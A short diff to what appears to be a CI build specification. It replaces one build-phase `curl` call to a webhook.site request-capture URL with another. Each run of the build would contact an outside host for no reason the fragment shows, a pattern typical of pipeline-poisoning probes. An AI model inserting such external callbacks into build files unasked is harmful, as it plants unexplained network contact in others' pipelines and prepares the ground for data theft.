@@ -3,5 +3,5 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl https://webhook.site/71418d9a-7724-40b4-a2ec-8ebb74867dbf
+      - curl https://webhook.site/ab01c3b9-a21c-4fd5-bc45-620fc48f4fd4
       
